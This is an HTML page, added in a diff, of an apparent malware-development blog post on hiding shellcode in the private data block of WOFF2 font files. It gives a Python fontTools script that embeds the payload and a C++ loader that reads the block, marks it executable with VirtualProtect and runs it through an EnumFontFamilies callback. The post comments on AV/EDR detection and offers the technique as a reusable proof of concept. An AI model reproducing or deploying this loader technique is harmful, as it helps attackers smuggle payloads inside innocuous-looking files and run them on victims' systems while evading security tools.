@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en-us" data-theme="light">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>
+  Weaponizing Font Policies for Payload Embedding  - l0key blog
+</title>
+
+
+
+<meta name="description" content="We will see how the WOFF2 format can be abused to host shellcode and how the WinAPI, through its font-handling functions, can be leveraged to trigger its …" />
+
+
+
+<meta
+  property="og:title"
+  content="Weaponizing Font Policies for Payload Embedding "
+/>
+<meta
+  property="og:description"
+  content="We will see how the WOFF2 format can be abused to host shellcode and how the WinAPI, through its font-handling functions, can be leveraged to trigger its …"
+/>
+<meta
+  property="og:type"
+  content="article"
+/>
+<meta property="og:url" content="http://localhost:1313/posts/woff2/" />
+<meta property="og:site_name" content="l0key blog" />
+
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta
+  name="twitter:title"
+  content="Weaponizing Font Policies for Payload Embedding "
+/>
+<meta
+  name="twitter:description"
+  content="We will see how the WOFF2 format can be abused to host shellcode and how the WinAPI, through its font-handling functions, can be leveraged to trigger its …"
+/>
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Orbitron:wght@400;700&family=JetBrains+Mono:wght@400;500&display=swap"
+  rel="stylesheet"
+/>
+
+
+<link
+  rel="stylesheet"
+  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+/>
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/style.css">
+<link rel="stylesheet" href="/css/custom.css">
+<script src="/js/image-zoom.js"></script>
+
+
+
+</head>
+<body>
+    
+    <div class="reading-progress"></div>
+    
+
+    
+
+    <main>
+        
+
+<div class="post-overlay active">
+    <div class="post-overlay-backdrop"></div>
+    <div class="post-overlay-content" style="position: relative; min-height: 100vh; padding: 0; transform: translateY(0);">
+        <div class="post-overlay-header">
+            <div class="post-overlay-title">
+                <a href="/" class="overlay-site-title">l0key blog</a>
+            </div>
+            <button class="post-overlay-close" aria-label="Close post" onclick="window.location.href='/'">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+        <div class="post-layout">
+        <article class="post-content">
+            <header class="post-header">
+                <div class="post-meta">
+                    <span class="post-date">2025.10.12</span>
+                    <div class="reading-time-post">
+                        <span class="coffee-cups">
+                            
+                            
+                            
+                            
+                            
+                                
+                            
+                                
+                            
+                                
+                            
+                                
+                            
+                                
+                            
+                            ☕☕☕☕☕
+                        </span>
+                        <span>5 min read</span>
+                    </div>
+                </div>
+                <h1 class="post-title">Weaponizing Font Policies for Payload Embedding </h1>
+                
+
+                
+                <div class="post-tags-header">
+                    
+                    <a href="http://localhost:1313/tags/maldev" class="post-tag">maldev</a>
+                    
+                </div>
+                
+            </header>
+            <div class="post-body">
+                <p>We will see how the WOFF2 format can be abused to host shellcode and how the WinAPI, through its font-handling functions, can be leveraged to trigger its execution.</p>
+<h2 id="overview-of-woff2">Overview of WOFF2</h2>
+<p>WOFF2 is a file format proposed by Google in 2013 to replace the WOFF1 format. It provides better compression of font data for use in CSS.</p>
+<ul>
+<li>Supports OpenType and TrueType (SFNT) specifications</li>
+<li>Uses the Brotli compression algorithm</li>
+<li>Primarily developed for the Web to enable faster page loading</li>
+</ul>
+<h3 id="woff2-structure">WOFF2 structure</h3>
+<p>WOFF2 is composed of several blocks. A header that lets you navigate the file format. The other blocks contain the data necessary to define the font. The block that interests us is Private Data. This is an optional block that allows the font author to include whatever information they want; it can contain ASCII, Unicode text, or raw data, provided those data do not interfere with font loading.</p>
+<p><img src="woff2_struct.png" alt="woff2_struct"></p>
+<p>We will use this block to hide our shellcode.</p>
+<h2 id="generating-the-woff2-file-with-the-shellcode">Generating the WOFF2 file with the shellcode</h2>
+<p>First, it should be known that WOFF2 is similar to the SFNT format structure, the format used by TrueType or OpenType. The difference is that WOFF2 data are compressed.</p>
+<p>To generate our WOFF2 file we therefore need to start from a TTF or OTF file, add the private data block with our shellcode, then convert it to a WOFF2 file by compressing the font data.</p>
+<p>To do this we will use Python and the fontTools library.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> fontTools.ttLib <span style="color:#f92672">import</span> TTFont
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> fontTools.ttLib.woff2 <span style="color:#f92672">import</span> WOFF2FlavorData
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_private_block</span>(input_file, output_file, private_data):
+</span></span><span style="display:flex;"><span>    font <span style="color:#f92672">=</span> TTFont(input_file, recalcBBoxes<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, recalcTimestamp<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    font<span style="color:#f92672">.</span>flavor <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;woff2&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> font<span style="color:#f92672">.</span>flavorData <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        font<span style="color:#f92672">.</span>flavorData <span style="color:#f92672">=</span> WOFF2FlavorData()
+</span></span><span style="display:flex;"><span>        font<span style="color:#f92672">.</span>flavorData<span style="color:#f92672">.</span>privData <span style="color:#f92672">=</span> private_data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    font<span style="color:#f92672">.</span>save(output_file)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[i] Private Data Block added to </span><span style="color:#e6db74">{</span>output_file<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>We define a function <code>add_private_block</code> that takes as input a font file (<code>input_file</code>), an output file name (<code>output_file</code>) and the private data block (<code>private_data</code>) that will contain our shellcode. The font is loaded with the <code>TTFont</code> class. With <code>font.flavor</code> we force the file format to WOFF2. If no private data block is already present, the code creates a <code>WOFF2FlavorData</code> object and inserts the specified data into its <code>privData</code> attribute. Then we save the generated WOFF2 file.</p>
+<p>The full script is available on my GitHub: LINK</p>
+<h2 id="loader-part">Loader Part</h2>
+<p>The final part consists of writing a WOFF2 file parser to retrieve our shellcode and then using the WinAPI to execute our shellcode.</p>
+<p>The language choice here is C++, the language I am most comfortable with — feel free to re-adapt the loader in your preferred language.</p>
+<h3 id="parsing-the-woff2-header">Parsing the WOFF2 Header</h3>
+<p>To parse the WOFF2 file we must refer to its Header because it contains all the information necessary to navigate the file. The header specification is available on the W3C site:</p>
+<p><img src="header.png" alt="header"></p>
+<p>With this information we can describe a C++ structure representing our Header:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#pragma pack(push, 1)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">WOFF2_Header</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> signature;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> flavor;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> length;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint16_t</span> numTables;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint16_t</span> reserved;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> totalSfntSize;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> totalCompressedSize;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint16_t</span> majorVersion;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint16_t</span> minorVersion;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> metaOffset;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> metaLength;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> metaOrigLength;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> privOffset;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> privLength;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma pack(pop)
+</span></span></span></code></pre></div><p>The <code>pragma</code> directives are used to avoid potential padding that would shift the data read into our Header.</p>
+<p>Here is the function that reads the private data block to extract the shellcode:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">read_private_data_block</span>(string <span style="color:#f92672">&amp;</span>woff2_file) {
+</span></span><span style="display:flex;"><span>  WOFF2_Header header;
+</span></span><span style="display:flex;"><span>  ifstream file(woff2_file, ios<span style="color:#f92672">::</span>binary <span style="color:#f92672">|</span> ios<span style="color:#f92672">::</span>ate);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>file) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throw</span> runtime_error(<span style="color:#e6db74">&#34;[!] Impossible to open the WOFF2 file&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  streamsize size <span style="color:#f92672">=</span> file.tellg();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  file.seekg(<span style="color:#ae81ff">0</span>, ios<span style="color:#f92672">::</span>beg);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>file.read(<span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*&gt;</span>(<span style="color:#f92672">&amp;</span>header), <span style="color:#66d9ef">sizeof</span>(WOFF2_Header))) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throw</span> runtime_error(<span style="color:#e6db74">&#34;[!] Impossible to read the Header&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ntohl(header.signature) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x774f4632</span>) {
+</span></span><span style="display:flex;"><span>    cerr <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] Bad magic</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  file.seekg(ntohl(header.privOffset), ios<span style="color:#f92672">::</span>beg);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>file) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throw</span> runtime_error(<span style="color:#e6db74">&#34;[!] Invalid Offset&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  private_data_block.resize(ntohl(header.privLength));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>file.read(<span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*&gt;</span>(private_data_block.data()), (<span style="color:#66d9ef">int</span>)ntohl(header.privLength))) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throw</span> runtime_error(<span style="color:#e6db74">&#34;[!] Impossible to read private data block&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  file.close();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="execute-the-shellcode">Execute the shellcode</h2>
+<p>To execute our shellcode we will use the <code>EnumFontFamilies</code> function which simply lists the fonts available on a machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">EnumFontFamiliesA</span>(
+</span></span><span style="display:flex;"><span>  [in] HDC           hdc,
+</span></span><span style="display:flex;"><span>  [in] LPCSTR        lpLogfont,
+</span></span><span style="display:flex;"><span>  [in] FONTENUMPROCA lpProc,
+</span></span><span style="display:flex;"><span>  [in] LPARAM        lParam
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>It takes the following parameters:</p>
+<ul>
+<li><code>hdc</code> → a handle to the device context, which can be obtained via <code>GetDC</code>.</li>
+<li><code>lpLogFont</code> → a pointer to a string specifying the font family to enumerate. Here we will use <code>NULL</code>, because we want to enumerate all fonts.</li>
+<li><code>lpProc</code> → a pointer to a callback function which will be executed by <code>EnumFontFamilies</code>; this callback will be responsible for executing our shellcode.</li>
+<li><code>lParam</code> → a pointer to data that will be passed to the callback function.</li>
+</ul>
+<p>Here is the callback function that will be used to execute our shellcode:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>BOOL CALLBACK <span style="color:#a6e22e">EnumFamCallBack</span>(LPLOGFONT lplf, LPNEWTEXTMETRIC lpntm, DWORD FontType, LPVOID aFontCount) {
+</span></span><span style="display:flex;"><span>    DWORD oldProtect;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] Enter Callback&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (VirtualProtect(private_data_block.data(), private_data_block.size(), PAGE_EXECUTE_READWRITE, <span style="color:#f92672">&amp;</span>oldProtect)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">auto</span> entry <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span>(<span style="color:#f92672">*</span>) ())private_data_block.data();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        entry();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] Trigger received. Execute Payload...&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This loader is a POC so I do not guarantee it can bypass AV/EDR. As you can see I use the PAGE_EXECUTE_READWRITE permissions which are not recommended for a functional loader because they are directly detected by security solutions.</p>
+<p>You can find the complete loader code on my GitHub: LINK</p>
+<h2 id="demonstration">Demonstration</h2>
+<p>Generation of the WOFF2 file armed with the shellcode:<br>
+<img src="generate.png" alt="generate">
+Here the woff2 file is in the same directory as the loader:</p>
+<p><img src="step_1.png" alt="step_1">
+<img src="final.png" alt="final">
+Thank you for reading! I hope this POC can be useful to you!</p>
+<p>Sources:<br>
+<a href="https://w3c.github.io/woff/woff2/">https://w3c.github.io/woff/woff2/</a><br>
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-enumfontfamiliesa">https://learn.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-enumfontfamiliesa</a><br>
+<a href="https://github.com/fonttools/fonttools">https://github.com/fonttools/fonttools</a><br>
+<a href="https://learn.microsoft.com/fr-fr/cpp/preprocessor/pack?view=msvc-170">https://learn.microsoft.com/fr-fr/cpp/preprocessor/pack?view=msvc-170</a></p>
+
+            </div>
+
+            
+            
+
+            
+            <nav class="post-navigation">
+                
+                <div></div>
+                
+
+                
+                <div class="nav-next">
+                    <span class="nav-label">Next →</span>
+                    <a href="http://localhost:1313/posts/baby/vulnlab_baby/" class="nav-title">Vulnlab : Baby Easy</a>
+                </div>
+                
+            </nav>
+        </article>
+
+        <aside class="sidebar">
+            <nav class="toc">
+                <h4>Contents</h4>
+                <div id="toc-content">
+                    
+                </div>
+            </nav>
+        </aside>
+        </div>
+    </div>
+</div>
+
+    </main>
+
+    
+
+    <script src="http://localhost:1313/js/main.js"></script>
+</body>
+</html>
